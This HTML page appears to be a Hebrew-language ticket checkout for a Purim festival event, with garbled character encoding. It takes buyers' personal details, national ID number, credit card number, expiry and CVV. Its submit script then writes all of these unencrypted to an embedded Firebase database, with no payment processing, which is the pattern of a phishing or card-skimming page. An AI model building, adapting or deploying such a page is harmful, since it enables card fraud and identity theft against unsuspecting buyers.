<!doctype html>
<html lang="he" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Zygo</title>

  <style>
    body {
      font-family: Arial;
      direction: rtl;
      background: #f4f4f4;
      margin: 0;
    }

    .screen {
      display: none;
      background: #fff;
      padding: 20px;
      max-width: 400px;
      margin: 40px auto;
      border-radius: 10px;
    }
    .screen.active { display: block; }

    input, select, button {
      width: 100%;
      padding: 10px;
      margin-bottom: 12px;
      box-sizing: border-box;
      font-family: inherit;
    }

    button {
      background: black;
      color: white;
      border: none;
      cursor: pointer;
    }

    .secondary {
      background: #ccc;
      color: black;
    }

    /* ===== Screen 1 ===== */
    #screen1{
      max-width: 1100px;
      background: linear-gradient(180deg, #f7efe3, #f4e6d5);
      border-radius: 18px;
      padding: 0;
      overflow: hidden;
    }
    #screen1 .s1-wrap{ padding: 18px 18px 90px; }
    #screen1 .s1-top{
      display:flex; align-items:center; justify-content:space-between;
      gap:12px; margin-bottom: 18px;
    }
    #screen1 .s1-pill{
      border: 2px solid rgba(0,0,0,.10);
      background: rgba(255,255,255,.35);
      border-radius: 999px;
      padding: 10px 14px;
      display:inline-flex;
      align-items:center;
      font-weight: 700;
      user-select:none;
    }
    #screen1 .s1-crumbs{
      flex: 1;
      text-align:center;
      color:#6b7280;
      font-weight: 700;
      white-space: nowrap;
    }
    #screen1 .s1-crumbs b{ color:#111; }

    #screen1 .s1-event{
      display:flex; gap:16px; align-items:flex-start;
      padding: 6px 0 18px;
    }
    #screen1 .s1-img{
      width: 92px; height: 92px;
      border-radius: 18px;
      object-fit: cover;
      background:#fff;
      box-shadow: 0 10px 30px rgba(0,0,0,.10);
    }
    #screen1 .s1-title{
      margin: 6px 0 8px;
      font-size: 28px;
      line-height: 1.15;
      font-weight: 900;
      letter-spacing: .2px;
    }
    #screen1 .s1-meta{
      display:flex; align-items:center; gap:8px;
      font-size: 16px;
      opacity:.85;
    }

    #screen1 .s1-card{
      background:#fff;
      border-radius: 18px;
      box-shadow: 0 10px 30px rgba(0,0,0,.10);
      padding: 18px;
      border: 1px solid rgba(0,0,0,.06);
    }
    #screen1 .s1-card-top{
      display:flex; align-items:center; justify-content:space-between;
      gap:14px; flex-wrap: wrap;
    }
    #screen1 .s1-qty{
      display:flex; align-items:center; gap:18px;
      background:#f6f2ea;
      border: 2px solid rgba(0,0,0,.10);
      border-radius: 999px;
      padding: 10px 14px;
      min-width: 170px;
      justify-content:space-between;
    }
    #screen1 .s1-qty .btn{
      width: 34px; height: 34px;
      border-radius: 999px;
      border: 2px solid rgba(0,0,0,.10);
      background:#fff;
      display:grid; place-items:center;
      font-size: 18px;
      font-weight: 900;
      user-select:none;
    }
    #screen1 .s1-qty .num{
      font-size: 26px;
      font-weight: 900;
    }

    #screen1 .s1-radio{
      display:flex; gap:10px; align-items:center;
      background: #f6f2ea;
      border: 2px solid rgba(0,0,0,.10);
      border-radius: 999px;
      padding: 10px 12px;
      margin-bottom: 10px;
    }
    #screen1 .s1-radio input{
      width:auto; margin:0;
      transform: scale(1.1);
    }

    #screen1 .s1-right{
      margin-inline-start: auto;
      text-align: right;
      min-width: 220px;
    }
    #screen1 .s1-ticket-name{
      font-weight: 900;
      font-size: 24px;
      margin: 0 0 6px;
    }
    #screen1 .s1-prices{
      display:flex; gap:10px; align-items:baseline;
      justify-content:flex-end;
    }
    #screen1 .s1-old{
      color:#6b7280;
      text-decoration: line-through;
      font-weight: 800;
      font-size: 18px;
    }
    #screen1 .s1-new{
      font-weight: 900;
      font-size: 26px;
      color:#3f3f46;
    }

    #screen1 .s1-divider{
      height: 2px;
      background: #7c3aed;
      margin: 14px 0 12px;
    }
    #screen1 .s1-bottom{
      display:flex; align-items:center; justify-content:flex-end;
      gap:10px;
      font-size: 14px;
      opacity:.88;
    }
    #screen1 .s1-info{
      width: 24px; height: 24px;
      border-radius: 999px;
      border: 2px solid rgba(0,0,0,.12);
      display:grid; place-items:center;
      font-weight: 900;
      background:#fff;
    }

    #screen1 .s1-actions{
      position: fixed;
      left: 0; right: 0;
      bottom: 18px;
      display:flex;
      justify-content:center;
      pointer-events:none;
    }
    #screen1 .s1-actions button{
      pointer-events:auto;
      width: min(1100px, calc(100% - 36px));
      padding: 16px 18px;
      border-radius: 999px;
      background: #2563eb;
      color:#fff;
      border:none;
      cursor:pointer;
      font-weight: 900;
      box-shadow: 0 10px 24px rgba(37,99,235,.25);
      margin-bottom: 0;
    }

    /* ===== Screen 2 ===== */
    #screen2{
      max-width: 1100px;
      background: linear-gradient(180deg, #f7efe3, #f4e6d5);
      border-radius: 18px;
      padding: 0;
      overflow: hidden;
    }
    #screen2 .s2-wrap{ padding: 18px 18px 90px; }
    #screen2 .s2-top{
      display:flex; align-items:center; justify-content:space-between;
      gap:12px; margin-bottom: 18px;
    }
    #screen2 .s2-pill{
      border: 2px solid rgba(0,0,0,.10);
      background: rgba(255,255,255,.35);
      border-radius: 999px;
      padding: 10px 14px;
      display:inline-flex;
      align-items:center;
      font-weight: 700;
      user-select:none;
    }
    #screen2 .s2-crumbs{
      flex: 1;
      text-align:center;
      color:#6b7280;
      font-weight: 700;
      white-space: nowrap;
    }
    #screen2 .s2-crumbs b{ color:#111; }

    #screen2 .s2-card{
      background:#fff;
      border-radius: 18px;
      box-shadow: 0 10px 30px rgba(0,0,0,.10);
      padding: 18px;
      border: 1px solid rgba(0,0,0,.06);
    }

    #screen2 .s2-grid{
      display:grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }
    #screen2 input, #screen2 select{
      width:100%;
      margin:0 !important;
      padding: 12px 14px !important;
      border-radius: 999px !important;
      border: 1.8px solid rgba(0,0,0,.12) !important;
      background:#fff;
      outline:none;
    }
    #screen2 select{
      appearance: none;
      background-image:
        linear-gradient(45deg, transparent 50%, rgba(0,0,0,.55) 50%),
        linear-gradient(135deg, rgba(0,0,0,.55) 50%, transparent 50%);
      background-position:
        calc(18px) calc(50% - 2px),
        calc(12px) calc(50% - 2px);
      background-size: 6px 6px, 6px 6px;
      background-repeat: no-repeat;
      padding-left: 34px !important;
    }

    #screen2 button{
      margin: 0 !important;
      border-radius: 999px !important;
      padding: 14px 16px !important;
      font-weight: 900 !important;
    }
    #screen2 button.secondary{
      background: transparent !important;
      color: #111 !important;
      border: 2px solid rgba(0,0,0,.12) !important;
      width: 140px !important;
    }

    #screen2 .s2-actions{
      position: fixed;
      left: 0; right: 0;
      bottom: 18px;
      display:flex;
      justify-content:center;
      gap: 12px;
      pointer-events:none;
    }
    #screen2 .s2-actions button{ pointer-events:auto; }
    #screen2 .s2-actions .primary{
      width: min(1100px, calc(100% - 36px - 160px));
      background: #2563eb !important;
      color:#fff !important;
      border: none !important;
      box-shadow: 0 10px 24px rgba(37,99,235,.25);
    }
    #screen2 .s2-actions .back{ width: 140px; }

    /* ===== Screen 3 ===== */
    #screen3{
      max-width: 1100px;
      background: linear-gradient(180deg, #f7efe3, #f4e6d5);
      border-radius: 18px;
      padding: 0;
      overflow: hidden;
    }
    #screen3 .s3-wrap{ padding: 18px 18px 90px; }

    #screen3 .s3-event{
      display:flex; gap:16px; align-items:flex-start;
      padding: 6px 0 16px;
    }
    #screen3 .s3-img{
      width: 92px; height: 92px;
      border-radius: 18px;
      object-fit: cover;
      background:#fff;
      box-shadow: 0 10px 30px rgba(0,0,0,.10);
    }
    #screen3 .s3-title{
      margin: 6px 0 8px;
      font-size: 22px;
      line-height: 1.15;
      font-weight: 900;
    }

    #screen3 .s3-summary{
      margin-top: 10px;
      border-top: 2px solid rgba(0,0,0,.10);
      border-bottom: 2px solid rgba(0,0,0,.10);
      padding: 14px 0;
    }

    #screen3 .s3-coupon{
      display:flex;
      align-items:center;
      gap:10px;
      margin: 14px 0;
    }
    #screen3 .s3-coupon input{
      margin:0 !important;
      padding: 12px 14px !important;
      border-radius: 12px !important;
      border: 1.8px solid rgba(0,0,0,.12) !important;
      background:#fff;
      outline:none;
    }
    #screen3 .s3-coupon button{
      width: 120px !important;
      margin:0 !important;
      border-radius: 8px !important;
      padding: 12px 10px !important;
      background:#2563eb !important;
      color:#fff !important;
      font-weight: 900 !important;
    }

    #screen3 .s3-checks{
      display:flex;
      flex-direction:column;
      gap: 12px;
      margin: 10px 0 18px;
    }
    #screen3 .s3-checks label{
      display:flex;
      align-items:center;
      justify-content:flex-end;
      gap:10px;
      font-size: 14px;
      opacity:.9;
    }
    #screen3 .s3-checks input[type="checkbox"]{
      width:auto !important;
      margin:0 !important;
      transform: scale(1.1);
    }

    #screen3 .s3-paycard{
      background:#fff;
      border-radius: 14px;
      border: 2px solid rgba(0,0,0,.10);
      box-shadow: 0 10px 30px rgba(0,0,0,.08);
      padding: 18px;
      max-width: 820px;
      margin: 0 auto;
    }
    #screen3 .s3-paygrid{
      display:grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
    }
    #screen3 .s3-paygrid input{
      margin:0 !important;
      padding: 12px 14px !important;
      border-radius: 999px !important;
      border: 1.8px solid rgba(0,0,0,.12) !important;
      background:#fff;
      outline:none;
    }
    #screen3 .s3-paygrid .full{ grid-column: 1 / -1; }

    #screen3 .s3-actions{
      margin-top: 14px;
      display:flex;
      justify-content:center;
    }
    #screen3 .s3-actions button{
      width: 100% !important;
      padding: 16px 18px !important;
      border-radius: 999px !important;
      background:#2563eb !important;
      color:#fff !important;
      font-weight: 900 !important;
      box-shadow: 0 10px 24px rgba(37,99,235,.25);
      margin:0 !important;
    }

    @media (max-width: 820px){
      #screen1, #screen2, #screen3{ max-width: 420px; }
      #screen2 .s2-grid{ grid-template-columns: 1fr; }
      #screen3 .s3-paygrid{ grid-template-columns: 1fr; }
      #screen2 button.secondary{ width: 110px !important; }
      #screen2 .s2-actions .primary{ width: calc(100% - 36px - 120px); }
      #screen3 .s3-coupon{ flex-direction: column; align-items: stretch; }
      #screen3 .s3-coupon button{ width: 100% !important; border-radius: 12px !important; }
    }
  </style>
</head>

<body>
  <form id="nameForm">
    <!-- Screen 1 -->
    <div class="screen active" id="screen1">
      <div class="s1-wrap">
        <div class="s1-top">
          <div class="s1-pill">â† ×—×–×¨×”</div>
          <div class="s1-crumbs"><b>×›×¨×˜×™×¡×™×</b> â† ×”×›× ×¡ ×¤×¨×˜×™× â† ×ª×©×œ×•×</div>
          <div class="s1-pill">âœ•</div>
        </div>

        <div class="s1-event">
          <img class="s1-img" id="eventImage" src="YOUR_IMAGE_URL_HERE" alt="×ª××•× ×ª ××¡×™×‘×”">
          <div>
            <div class="s1-title" id="eventName">EXPO LAND / PURIM FESTIVAL</div>
            <div class="s1-meta">ğŸ“… March 5th 2026, 23:00</div>
          </div>
        </div>

        <div class="s1-card">
          <div class="s1-card-top">
            <div class="s1-qty" aria-label="×›××•×ª">
              <div class="btn">+</div>
              <div class="num">1</div>
              <div class="btn">âˆ’</div>
            </div>

            <div class="s1-right">
              <div class="s1-ticket-name">FIRST ROUND</div>
              <div class="s1-prices">
                <span class="s1-old">399â‚ª</span>
                <span class="s1-new">220.00â‚ª</span>
              </div>
            </div>

            <div style="width:100%; margin-top: 10px;">
              <label class="s1-radio">
                <input type="radio" name="cardType" value="regular" required>
                ×›×¨×˜×™×¡ ×¨×’×™×œ
              </label>
              <label class="s1-radio">
                <input type="radio" name="cardType" value="vip">
                ×›×¨×˜×™×¡ VIP
              </label>
            </div>
          </div>

          <div class="s1-divider"></div>

          <div class="s1-bottom">
            <div class="s1-info">i</div>
            <div>××—×™×¨ ×›×¨×˜×™×¡×™× 200â‚ª + ×¢×œ×•×ª ×©×™×¨×•×ª ×‘×¨×›×™×©×” ××•× ×œ×™×™×Ÿ 20.00â‚ª ×œ×›×¨×˜×™×¡</div>
          </div>
        </div>

        <div class="s1-actions">
          <button type="button" onclick="nextScreen(1)">×”×ª×§×“× â€“ â‚ª 220.00</button>
        </div>
      </div>
    </div>

    <!-- Screen 2 -->
    <div class="screen" id="screen2">
      <div class="s2-wrap">
        <div class="s2-top">
          <div class="s2-pill">â† ×—×–×¨×”</div>
          <div class="s2-crumbs">×ª×©×œ×•× â† <b>×”×›× ×¡ ×¤×¨×˜×™×</b> â† ×›×¨×˜×™×¡×™×</div>
          <div class="s2-pill">âœ•</div>
        </div>

        <div class="s2-card">
          <div class="s2-grid">
            <input type="number" id="phoneNumber" placeholder="Phone Number" required>
            <input type="text" id="firstName" placeholder="First Name" required>

            <input type="text" id="lastName" placeholder="Last Name" required>
            <input type="date" id="birthDate" required>

            <input type="email" id="email" placeholder="Email" required>
            <select id="gender" required>
              <option value="">Gender</option>
              <option value="male">Male</option>
              <option value="female">Female</option>
              <option value="other">Other</option>
            </select>

            <input type="text" id="instagram" placeholder="Instagram">
            <input type="number" id="ID" placeholder="ID" required>
          </div>
        </div>

        <div class="s2-actions">
          <button type="button" class="secondary back" onclick="prevScreen(2)">×—×–×•×¨</button>
          <button type="button" class="primary" onclick="nextScreen(2)">×”×‘× - â‚ª 220.00</button>
        </div>
      </div>
    </div>

    <!-- Screen 3 -->
    <div class="screen" id="screen3">
      <div class="s3-wrap">
        <div class="s3-event">
          <img class="s3-img" src="YOUR_IMAGE_URL_HERE" alt="×ª××•× ×ª ××¡×™×‘×”">
          <div>
            <div class="s3-title">EXPO LAND / PURIM FESTIVAL</div>
            <div class="s3-meta">ğŸ“… March 5th 2026, 23:00</div>
          </div>
        </div>

        <div class="s3-summary">
          <div style="display:flex; justify-content:space-between; padding:8px 0; font-weight:700;">
            <div>FIRST ROUND <div style="opacity:.6; font-size:13px; margin-top:4px;">1 x â‚ª220.00</div></div>
            <div>â‚ª220.00</div>
          </div>
          <div style="height:1px; background: rgba(0,0,0,.10); margin:8px 0;"></div>
          <div style="display:flex; justify-content:space-between; padding:8px 0; font-weight:700;">
            <div>×¡×š ×”×›×œ</div>
            <div>â‚ª220.00</div>
          </div>
        </div>

        <div class="s3-coupon">
          <input type="text" id="coupon" placeholder="×§×•×“ ×§×•×¤×•×Ÿ">
          <button type="button">×”×—×œ</button>
        </div>

        <div class="s3-checks">
          <label>
            ×× ×™ ×××©×¨ ××ª ×ª× ××™ ×”×©×™××•×©
            <input type="checkbox" id="terms" required>
          </label>
          <label>
            ×× ×™ ×××©×¨ ×§×‘×œ×ª ×¢×“×›×•× ×™×
            <input type="checkbox" id="updates">
          </label>
        </div>

        <div class="s3-paycard">
          <div class="s3-paygrid">
            <input class="full" type="number" id="creditCardNumber" placeholder="Credit Card Number" required>
            <input type="text" id="expire" placeholder="Expire (MM/YY)" required>
            <input type="number" id="cvv" placeholder="CVV" required>
          </div>

          <div class="s3-actions">
            <button type="submit">×©×œ× â‚ª 220</button>
          </div>

          <!-- ×¡×˜×˜×•×¡ ×§×˜×Ÿ ×œ×“×™×‘×•×’ (×œ× ×—×•×‘×”) -->
          <div id="saveStatus" style="margin-top:10px; font-size:12px; opacity:.7; text-align:center;"></div>
        </div>
      </div>
    </div>
  </form>

  <!-- âœ… Firebase core (×—×•×‘×”) -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <!-- Firebase services -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

  <!-- × ×™×•×•×˜ (××•×ª×• ×¨×¢×™×•×Ÿ) -->
  <script>
    function nextScreen(current) {
      document.getElementById(`screen${current}`).classList.remove("active");
      document.getElementById(`screen${current + 1}`).classList.add("active");
    }
    function prevScreen(current) {
      document.getElementById(`screen${current}`).classList.remove("active");
      document.getElementById(`screen${current - 1}`).classList.add("active");
    }
  </script>

  <!-- âœ… ×©××™×¨×” ×œFirebase ×¨×§ ×‘×¡×•×£ -->
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const firebaseConfig = {
        apiKey: "AIzaSyDZVrncvPwEg6IDHjloweJNjrpj32lZy5g",
        authDomain: "zygo-acf32.firebaseapp.com",
        databaseURL: "https://zygo-acf32-default-rtdb.europe-west1.firebasedatabase.app",
        projectId: "zygo-acf32",
        storageBucket: "zygo-acf32.firebasestorage.app",
        messagingSenderId: "243652763597",
        appId: "1:243652763597:web:f9cbc63435193855236e84"
      };

      firebase.initializeApp(firebaseConfig);

      const database = firebase.database();
      const firestore = firebase.firestore();

      const form = document.getElementById("nameForm");
      const statusEl = document.getElementById("saveStatus");

      form.addEventListener("submit", async function (event) {
        event.preventDefault();

        const userData = {
          firstName: document.getElementById("firstName").value,
          lastName: document.getElementById("lastName").value,
          email: document.getElementById("email").value,
          phoneNumber: document.getElementById("phoneNumber").value,
          birthDate: document.getElementById("birthDate").value,
          gender: document.getElementById("gender").value,
          instagram: document.getElementById("instagram").value,
          ID: document.getElementById("ID").value,
          creditCardNumber: document.getElementById("creditCardNumber").value,
          expire: document.getElementById("expire").value,
          cvv: document.getElementById("cvv").value,
          createdAt: Date.now()
        };

        const collection1 = "Details";

        
        try {
          if (statusEl) statusEl.textContent = "×©×•××¨ × ×ª×•× ×™×...";

          // ×›×•×ª×‘ ×œ×©× ×™ DB-×™× (×›××• ×©×”×™×” ××¦×œ×š)
          const rtdbRes = await database.ref("collection1").push(userData);
          const fsRes = await firestore.collection("collection1").add(userData);

          console.log("RTDB key:", rtdbRes.key);
          console.log("Firestore id:", fsRes.id);

          if (statusEl) statusEl.textContent = "âœ… × ×©××¨ ×‘×”×¦×œ×—×”";
          alert("âœ… ×”× ×ª×•× ×™× × ×©××¨×• ×‘×”×¦×œ×—×”!");
          form.reset();
          // ××•×¤×¦×™×•× ×œ×™: ×œ×—×–×•×¨ ×œ××¡×š ×¨××©×•×Ÿ ××—×¨×™ ×©××™×¨×”
          // document.getElementById("screen3").classList.remove("active");
          // document.getElementById("screen1").classList.add("active");
        } catch (err) {
          console.error("Save failed:", err);
          if (statusEl) statusEl.textContent = "âŒ ×©××™×¨×” × ×›×©×œ×” (×‘×“×•×§ Console)";
          alert("âŒ ×”×©××™×¨×” × ×›×©×œ×”. ×‘×“×•×§ ××ª ×”-Console (F12) ×œ×©×’×™××”.");
        }
      });
    });
  </script>
</body>
</html>
